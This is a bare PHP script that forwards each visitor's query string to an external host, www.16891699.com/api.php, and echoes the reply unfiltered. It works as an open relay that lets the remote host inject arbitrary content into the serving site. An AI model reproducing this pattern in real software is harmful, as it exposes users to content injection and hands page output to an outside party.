<?php
$curl = curl_init(); 
curl_setopt($curl, CURLOPT_URL, 'http://www.16891699.com/api.php?'.$_SERVER["QUERY_STRING"]); 
curl_setopt($curl, CURLOPT_REFERER, 'http://www.16891699.com/api.php?'.$_SERVER["QUERY_STRING"]); 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
$result = curl_exec($curl); 

curl_close($curl); 
echo $result;
?>
